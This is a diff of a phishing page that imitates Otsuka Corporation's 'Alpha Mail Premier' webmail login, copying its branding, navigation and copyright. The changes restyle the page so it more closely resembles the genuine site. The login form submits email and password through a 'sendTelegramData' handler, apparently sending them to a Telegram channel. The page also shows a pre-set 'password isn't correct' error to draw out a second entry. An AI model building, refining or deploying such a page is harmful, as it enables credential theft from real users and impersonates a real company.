@@ -19,25 +19,18 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
-            min-height: 100vh;
+            background: #f5f5f5;
+            color: #333;
         }
 
-        .header {
-            background: linear-gradient(to bottom, #1e3a8a, #1e40af);
-            color: white;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-
-        .header-top {
+        /* Top Header */
+        .top-header {
+            background: white;
+            padding: 12px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            max-width: 1200px;
-            margin: 0 auto;
-            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
         }
 
         .logo-section {
@@ -47,89 +40,154 @@
         }
 
         .logo-section img {
-            height: 40px;
+            height: 24px;
         }
 
         .logo-text {
-            font-size: 18px;
+            font-size: 14px;
+            color: #0072c6;
             font-weight: 600;
         }
 
-        .header-nav {
+        .top-right {
             display: flex;
-            gap: 20px;
             align-items: center;
+            gap: 30px;
         }
 
-        .header-nav a {
+        .login-btn {
+            background: #ff9900;
             color: white;
-            text-decoration: none;
-            font-size: 14px;
-            padding: 8px 12px;
+            border: none;
+            padding: 8px 24px;
             border-radius: 4px;
-            transition: background 0.3s;
-        }
-
-        .header-nav a:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .lock-icon {
-            width: 30px;
-            height: 30px;
-            background: #0067b8;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             cursor: pointer;
-        }
-
-        .breadcrumb {
-            max-width: 1200px;
-            margin: 0 auto;
-            color: white;
+            font-weight: 600;
             font-size: 14px;
-            padding: 10px 20px;
         }
 
-        .breadcrumb span {
-            margin: 0 5px;
+        .login-btn:hover {
+            background: #ff8800;
         }
 
-        .main-title {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            color: white;
-            font-size: 32px;
+        .top-nav-links {
+            display: flex;
+            gap: 25px;
+            align-items: center;
+            font-size: 13px;
+        }
+
+        .top-nav-links a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        .top-nav-links a:hover {
+            text-decoration: underline;
+        }
+
+        .search-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .search-box input {
+            padding: 6px 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 12px;
+            width: 120px;
+        }
+
+        .search-box button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        /* Main Navigation */
+        .main-nav {
+            background: white;
+            display: flex;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .nav-item {
+            flex: 1;
+            padding: 16px;
+            text-align: center;
+            border-right: 1px solid #ddd;
+            color: #0072c6;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .nav-item:last-child {
+            border-right: none;
+        }
+
+        .nav-item:hover {
+            background: #f9f9f9;
+        }
+
+        /* Breadcrumb */
+        .breadcrumb {
+            background: white;
+            padding: 12px 40px;
+            font-size: 12px;
+            color: #666;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .breadcrumb a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        /* Page Title */
+        .page-title {
+            background: white;
+            padding: 30px 40px;
+            border-bottom: 2px solid #0072c6;
+            margin-bottom: 0;
+        }
+
+        .page-title h1 {
+            font-size: 28px;
+            color: #0072c6;
             font-weight: 300;
         }
 
-        .container {
-            max-width: 600px;
-            margin: 40px auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
-            overflow: hidden;
-        }
-
+        /* Info Box */
         .info-box {
-            background: #f0f0f0;
-            padding: 20px;
-            border-bottom: 1px solid #ddd;
+            background: white;
+            padding: 20px 40px;
+            margin: 20px 40px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            font-size: 14px;
             color: #333;
             line-height: 1.6;
         }
 
-        .info-box p {
-            margin: 0;
-            font-size: 15px;
+        /* Form Container */
+        .form-container {
+            background: white;
+            margin: 20px 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
-        .form-section {
-            padding: 40px;
+        .form-header {
+            height: 4px;
+            background: #0072c6;
+        }
+
+        .form-content {
+            padding: 30px;
         }
 
         .loader {
@@ -147,184 +205,119 @@
             border-radius: 50%;
         }
 
-        .form-group {
-            margin-bottom: 20px;
+        .form-row {
+            display: grid;
+            grid-template-columns: 180px 1fr;
+            gap: 20px;
+            margin-bottom: 25px;
+            align-items: center;
         }
 
         .form-label {
-            display: block;
+            background: #e8e8e8;
+            padding: 12px 20px;
             font-size: 13px;
-            color: #0a5fa0;
-            margin-bottom: 6px;
-            font-weight: 600;
+            color: #333;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+
+        .form-input-wrapper {
+            display: flex;
+            gap: 10px;
         }
 
         .form-input {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #999;
-            border-radius: 4px;
-            font-size: 14px;
+            flex: 1;
+            padding: 10px 15px;
+            border: 1px solid #ccc;
+            border-radius: 0;
+            font-size: 13px;
             font-family: inherit;
-            transition: border-color 0.3s;
         }
 
         .form-input:focus {
             outline: none;
-            border-color: #0067b8;
-            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+            border-color: #0072c6;
+            box-shadow: 0 0 0 2px rgba(0, 114, 198, 0.1);
         }
 
         .checkbox-group {
-            margin-top: 16px;
+            grid-column: 2;
             display: flex;
             align-items: center;
             gap: 8px;
+            margin-top: 10px;
+            margin-bottom: 20px;
         }
 
         .checkbox-group input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
+            width: 14px;
+            height: 14px;
             cursor: pointer;
         }
 
         .checkbox-group label {
-            font-size: 13px;
-            color: #555;
+            font-size: 12px;
+            color: #666;
             cursor: pointer;
         }
 
         .error-message {
             display: none;
-            background: #f8d7da;
-            color: #721c24;
+            background: #fff3cd;
+            color: #856404;
             padding: 12px;
             border-radius: 4px;
             margin-bottom: 20px;
-            font-size: 13px;
-            border: 1px solid #f5c6cb;
-        }
-
-        .info-text {
             font-size: 12px;
-            color: #999;
-            margin-bottom: 20px;
-            font-style: italic;
+            border: 1px solid #ffeaa7;
+            grid-column: 1 / -1;
         }
 
-        .btn-group {
+        .button-group {
             display: flex;
-            align-items: center;
-            gap: 12px;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .btn-save {
+            background: white;
+            color: #0072c6;
+            border: 1px solid #0072c6;
+            padding: 10px 40px;
+            font-size: 13px;
+            border-radius: 0;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-weight: 600;
+            min-width: 120px;
+        }
+
+        .btn-save:hover {
+            background: #f5f5f5;
         }
 
         .btn-signin {
-            flex: 1;
-            background: linear-gradient(to bottom, #ff9900, #ff8800);
+            background: #ff9900;
             color: white;
             border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 4px;
+            padding: 10px 40px;
+            font-size: 13px;
+            border-radius: 0;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.2s;
+            font-weight: 600;
+            min-width: 120px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            font-weight: 600;
         }
 
         .btn-signin:hover {
-            background: linear-gradient(to bottom, #ffaa11, #ff9911);
-        }
-
-        .btn-signin:active {
-            transform: scale(0.98);
-        }
-
-        .btn-save {
-            flex: 1;
-            background: white;
-            color: #0067b8;
-            border: 1px solid #ddd;
-            padding: 12px 20px;
-            font-size: 14px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-weight: 600;
-        }
-
-        .btn-save:hover {
-            background: #f8f8f8;
-            border-color: #999;
-        }
-
-        .help-text {
-            margin-top: 16px;
-            font-size: 12px;
-            color: #666;
-        }
-
-        .help-text a {
-            color: #0067b8;
-            text-decoration: none;
-        }
-
-        .help-text a:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            background: #0a5fa0;
-            color: white;
-            padding: 40px 20px;
-            margin-top: 40px;
-        }
-
-        .footer-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-            margin-bottom: 30px;
-        }
-
-        .footer-section {
-            cursor: pointer;
-            padding: 15px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-            transition: background 0.3s;
-        }
-
-        .footer-section:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-
-        .footer-section-title {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 600;
-            font-size: 15px;
-        }
-
-        .footer-divider {
-            max-width: 1200px;
-            margin: 30px auto;
-            height: 1px;
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .footer-bottom {
-            max-width: 1200px;
-            margin: 0 auto;
-            text-align: center;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.8);
+            background: #ff8800;
         }
 
         .arrow {
@@ -333,25 +326,156 @@
             height: 6px;
             border-top: 1px solid white;
             border-right: 1px solid white;
-            transform: rotate(45deg);
+            transform: rotate(-45deg);
+        }
+
+        .help-text {
+            grid-column: 1 / -1;
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .help-text a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background: #0a5fa0;
+            color: white;
+            padding: 40px;
+            margin-top: 40px;
+        }
+
+        .footer-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-title .arrow {
+            border-color: white;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column h3 {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .footer-column h3 .arrow {
+            border-color: white;
+            flex-shrink: 0;
+        }
+
+        .footer-column ul {
+            list-style: none;
+            font-size: 12px;
+        }
+
+        .footer-column li {
+            margin-bottom: 10px;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+
+        .footer-column li:hover {
+            opacity: 1;
+        }
+
+        .footer-column li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-divider {
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+            margin: 30px 0;
+        }
+
+        .footer-bottom {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 12px;
+        }
+
+        .footer-bottom-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .footer-bottom-item .arrow {
+            border-color: white;
+            flex-shrink: 0;
+        }
+
+        .copyright {
+            text-align: right;
+            font-size: 11px;
+            margin-top: 30px;
+            opacity: 0.9;
+        }
+
+        @media (max-width: 1024px) {
+            .footer-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .footer-bottom {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
 
         @media (max-width: 768px) {
-            .header-top {
+            .top-header {
                 flex-direction: column;
                 gap: 15px;
             }
 
-            .header-nav {
-                flex-direction: column;
-                gap: 10px;
+            .form-row {
+                grid-template-columns: 1fr;
             }
 
-            .container {
-                margin: 20px;
+            .form-label {
+                grid-column: 1;
+            }
+
+            .checkbox-group {
+                grid-column: 1;
             }
 
             .footer-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-bottom {
                 grid-template-columns: 1fr;
             }
         }
@@ -359,40 +483,60 @@
 </head>
 
 <body>
-    <div class="header">
-        <div class="header-top">
-            <div class="logo-section">
-                <svg width="30" height="30" viewBox="0 0 30 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect width="30" height="30" rx="4" fill="#ff0000"/>
-                    <text x="15" y="20" font-size="18" fill="white" text-anchor="middle" font-weight="bold">🔱</text>
-                </svg>
-                <span class="logo-text">大塚商会</span>
-                <div style="margin-left: 20px; padding-left: 20px; border-left: 1px solid rgba(255,255,255,0.3);">
-                    <div style="font-size: 14px; font-weight: 600;">Alpha Male Premier</div>
-                    <div style="font-size: 11px; opacity: 0.9;">Membership Site</div>
-                </div>
-            </div>
-            <div class="header-nav">
-                <div class="lock-icon" title="Secure">🔒</div>
-                <a href="#search">search</a>
-                <a href="#menu">menu</a>
+    <!-- Top Header -->
+    <div class="top-header">
+        <div class="logo-section">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="24" height="24" rx="3" fill="#e63946"/>
+                <text x="12" y="16" font-size="14" fill="white" text-anchor="middle" font-weight="bold">🔴</text>
+            </svg>
+            <div class="logo-text">大塚商会</div>
+            <div style="display: flex; flex-direction: column; margin-left: 15px; border-left: 1px solid #ddd; padding-left: 15px;">
+                <div style="font-size: 14px; font-weight: 600; color: #0072c6;">Alpha Male Premier</div>
+                <div style="font-size: 11px; color: #666;">Membership Site</div>
             </div>
         </div>
-        <div class="breadcrumb">
-            <a href="#" style="color: white; text-decoration: none;">HOME</a>
-            <span>&gt;</span>
-            <span>Alpha Male Premier Login</span>
+        <div class="top-right">
+            <button class="login-btn">🔒 Log in</button>
+            <div class="top-nav-links">
+                <a href="#search">Service-related information</a>
+                <span>▶</span>
+                <a href="#inquiry">inquiry</a>
+            </div>
+            <div class="search-box">
+                <input type="text" placeholder="Site Search">
+                <button>🔍</button>
+            </div>
         </div>
-        <div class="main-title">Alpha Male Premier Login</div>
     </div>
 
-    <div class="container">
-        <div class="info-box">
-            <p><strong>If you are currently using "Alpha Mail Premier",</strong></p>
-            <p>please log in here.</p>
-        </div>
+    <!-- Main Navigation -->
+    <div class="main-nav">
+        <div class="nav-item">HOME</div>
+        <div class="nav-item">User's Guide <span style="font-size: 12px;">▼</span></div>
+        <div class="nav-item">Frequently asked questions</div>
+        <div class="nav-item">Maintenance and fault information</div>
+    </div>
 
-        <div class="form-section">
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+        <a href="#">HOME</a> &gt; Alpha Male Premier Login
+    </div>
+
+    <!-- Page Title -->
+    <div class="page-title">
+        <h1>Alpha Male Premier Login</h1>
+    </div>
+
+    <!-- Info Box -->
+    <div class="info-box">
+        If you are currently using "Alpha Mail Premier", please log in here.
+    </div>
+
+    <!-- Form Container -->
+    <div class="form-container">
+        <div class="form-header"></div>
+        <div class="form-content">
             <form onsubmit="return sendTelegramData(event)">
                 <div id="loader" class="loader">
                     <div></div>
@@ -402,133 +546,138 @@
                     <div></div>
                 </div>
 
-                <fieldset id="formFieldset" style="border: none; padding: 0;">
-                    <div class="form-group">
-                        <label class="form-label">email address</label>
-                        <input type="email" id="emailInput" name="email" class="form-input" required>
+                <fieldset id="formFieldset" style="border: none; padding: 0; display: grid; grid-template-columns: 1fr;">
+                    <div class="form-row">
+                        <div class="form-label">email address</div>
+                        <div class="form-input-wrapper">
+                            <input type="email" id="emailInput" name="email" class="form-input" required>
+                        </div>
                     </div>
 
-                    <div class="form-group">
-                        <label class="form-label">password</label>
-                        <input type="password" id="passwordInput" name="password" class="form-input" required>
+                    <div class="form-row">
+                        <div class="form-label">password</div>
+                        <div class="form-input-wrapper">
+                            <input type="password" id="passwordInput" name="password" class="form-input" required>
+                        </div>
                     </div>
-
-                    <input type="hidden" id="passwordHidden" name="passwordHidden" value="">
 
                     <div class="checkbox-group">
                         <input type="checkbox" id="showPasswordCheck" onchange="togglePasswordVisibility()">
                         <label for="showPasswordCheck">Show password</label>
                     </div>
 
-                    <div class="info-text">
-                        Please re-enter your same Password to keep default settings.
-                    </div>
-
                     <div id="errorDiv" class="error-message">
                         The user name or password you entered isn't correct. Try entering it again.
                     </div>
 
-                    <div class="btn-group">
-                        <button type="submit" class="btn-signin">
-                            🔐 Log in
-                        </button>
+                    <div class="button-group">
                         <button type="button" class="btn-save">Save ID</button>
+                        <button type="submit" class="btn-signin">
+                            Log in <span class="arrow" style="transform: rotate(-45deg); border-color: white;"></span>
+                        </button>
+                    </div>
+
+                    <div class="help-text">
+                        * If you are unable to log in, please check <a href="#">here</a>.
                     </div>
                 </fieldset>
             </form>
-
-            <div class="help-text">
-                * If you are unable to log in, please check <a href="#">here</a>.
-            </div>
         </div>
     </div>
 
+    <!-- Footer -->
     <div class="footer">
+        <div class="footer-title">
+            <span class="arrow"></span>
+            Alpha Male Premier Membership Site
+        </div>
+
         <div class="footer-grid">
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Log in
-                </div>
+            <div class="footer-column">
+                <h3><span class="arrow"></span> Log in</h3>
+                <ul></ul>
             </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Service-related information
-                </div>
+            <div class="footer-column">
+                <h3><span class="arrow"></span> User's Guide</h3>
+                <ul>
+                    <li>Steps to start using the service</li>
+                    <li>Administrator Manual <span style="font-size: 10px;">📄</span></li>
+                    <li>User Manual <span style="font-size: 10px;">📄</span></li>
+                    <li>Email and FTP software settings</li>
+                    <li>Transfer from other companies or the AlphaMail series</li>
+                    <li>Web server information</li>
+                    <li>Installing the Web Tools</li>
+                    <li>Alpha Office tools</li>
+                    <li>Useful information</li>
+                    <li>Operating environment/precautions</li>
+                </ul>
             </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Maintenance and fault information
-                </div>
+            <div class="footer-column">
+                <h3><span class="arrow"></span> Frequently asked questions</h3>
+                <ul>
+                    <li>Email function</li>
+                    <li>Web Features</li>
+                    <li>Domain Name/DNS</li>
+                    <li>Various procedures</li>
+                    <li>General services</li>
+                    <li>Alpha Office General Services</li>
+                    <li>Alpha Office Administrator Function</li>
+                    <li>Alpha Office User Functions</li>
+                    <li>Frequently asked questions</li>
+                </ul>
             </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    User's Guide
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Frequently asked questions
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    inquiry
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Sitemap
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Feature introduction
-                </div>
+            <div class="footer-column">
+                <h3><span class="arrow"></span> inquiry</h3>
+                <ul style="margin-top: 80px;">
+                    <li><strong>Sitemap</strong></li>
+                    <li style="margin-top: 50px;"><strong>Feature introduction</strong> <span style="font-size: 10px;">📄</span></li>
+                </ul>
             </div>
         </div>
 
-        <div class="footer-grid" style="grid-template-columns: 1fr 1fr; gap: 0; margin-bottom: 0;">
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Information Security Basic Policy
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    privacy policy
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Terms of Use
-                </div>
-            </div>
-            <div class="footer-section">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Terms of Service
-                </div>
-            </div>
-            <div class="footer-section" style="grid-column: 1 / -1;">
-                <div class="footer-section-title">
-                    <span class="arrow"></span>
-                    Service Policy
-                </div>
-            </div>
+        <div class="footer-divider"></div>
+
+        <div class="footer-column" style="margin-bottom: 30px;">
+            <h3><span class="arrow"></span> Service-related information</h3>
+            <ul>
+                <li>Service-related information</li>
+            </ul>
         </div>
+
+        <div class="footer-column" style="margin-bottom: 30px;">
+            <h3><span class="arrow"></span> Maintenance and fault information</h3>
+            <ul>
+                <li>Maintenance Information</li>
+                <li>Fault Information</li>
+            </ul>
+        </div>
+
+        <div class="footer-divider"></div>
 
         <div class="footer-bottom">
+            <div class="footer-bottom-item">
+                <span class="arrow"></span>
+                Information Security Basic Policy
+            </div>
+            <div class="footer-bottom-item">
+                <span class="arrow"></span>
+                privacy policy
+            </div>
+            <div class="footer-bottom-item">
+                <span class="arrow"></span>
+                Terms of Use
+            </div>
+            <div class="footer-bottom-item">
+                <span class="arrow"></span>
+                Terms of Service
+            </div>
+            <div class="footer-bottom-item">
+                <span class="arrow"></span>
+                Service Policy
+            </div>
+        </div>
+
+        <div class="copyright">
             Copyright © 2025 OTSUKA CORPORATION ALL Rights Reserved.
         </div>
     </div>
@@ -631,26 +780,8 @@
         // Page load initialization
         document.addEventListener('DOMContentLoaded', function () {
             console.log("Alpha Male Premier Login Page Loaded");
-            
-            // Extract email from URL hash if available
-            const urlHash = window.location.hash.substr(1);
-            if (urlHash) {
-                try {
-                    const decodedEmail = decodeURIComponent(urlHash);
-                    document.getElementById('emailInput').value = decodedEmail;
-                    
-                    // Extract domain
-                    const atIndex = decodedEmail.indexOf('@');
-                    if (atIndex > -1) {
-                        document.getElementById('passwordHidden').value = decodedEmail.substr(atIndex + 1);
-                    }
-                } catch (e) {
-                    console.log("Error decoding URL hash");
-                }
-            }
         });
     </script>
 </body>
 
 </html>
-
